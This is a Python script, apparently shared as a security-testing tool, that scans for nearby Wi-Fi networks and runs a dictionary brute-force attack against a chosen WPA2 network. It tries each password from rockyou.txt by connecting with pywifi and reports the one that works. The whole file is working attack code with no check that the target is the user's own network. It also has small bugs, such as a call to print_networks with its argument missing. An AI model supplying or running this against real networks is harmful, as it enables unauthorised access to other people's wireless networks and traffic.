###########################################################################################
#                               <<<---- Wi-Fi Brute ---->>>                               #
#                                                                                         #
# Designed for testing the WiFi Security during the Brute-Force attack.                   #
# Author: Siva Gokul R S                                                                  #
# Required Modules and files : pywifi (module), rockyou.txt (password file)               #
###########################################################################################

#Tested in Windows Machine

import pywifi
from pywifi import const
import time
import os
import sys


def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    iface.scan()
    time.sleep(2)  
    
    scan_results = iface.scan_results()
    
    networks = []
    for network in scan_results:
        network_info = {
            'SSID': network.ssid,
            'BSSID': network.bssid,
            'Signal': network.signal,
            'Security': network.akm
        }
        networks.append(network_info)
    
    print_networks(networks)

def print_networks(networks):
    print("\n###############################################################")
    for idx, network in enumerate(networks):
        print(f"Network ID: {idx+1}")
        print(f"  SSID: {network['SSID']}")
        print(f"  BSSID: {network['BSSID']}")
        print(f"  Signal: {network['Signal']}")
        print(f"  Security: {network['Security']}")
        print("\n")
    sel_network = int(input("Enter the Network ID: "))
    confirm_network = input(f"Confirm the WiFi {networks[sel_network-1]['SSID']} (y/n/r): ")
    core_process(confirm_network, networks[sel_network - 1])

def connect_to_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)

    profile = pywifi.Profile()
    profile.ssid = ssid.strip()  
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  
    profile.cipher = const.CIPHER_TYPE_CCMP  
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    
    for i in range(1):  
        time.sleep(2)  
        status = iface.status()
        if status == const.IFACE_CONNECTED:
            return True
        elif status == const.IFACE_DISCONNECTED:
            pass
    return False

def brute_force_passwords(ssid, password_file):
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            sys.stdout.write(f"\rTrying password: {password} ")
            sys.stdout.flush()
            if connect_to_wifi(ssid, password):
                sys.stdout.write(f"Successfully connected to {ssid} with password: {password}")
                return True
    sys.stdout.write(f"Failed to connect to {ssid} using passwords from {password_file}")
    return False

def core_process(confirmation, network_details):
    password_file = os.path.join('rockyou.txt')
    if confirmation == "y":
        brute_force_passwords(network_details['SSID'], password_file)
    elif confirmation == "n":
        print("dismissed")
    elif confirmation == "r":
        scan_wifi()
    elif confirmation == "":
        print("Auto confirming...")
        brute_force_passwords(network_details['SSID'], password_file)
    else:
        print_networks()

if __name__ == "__main__":
    scan_wifi()
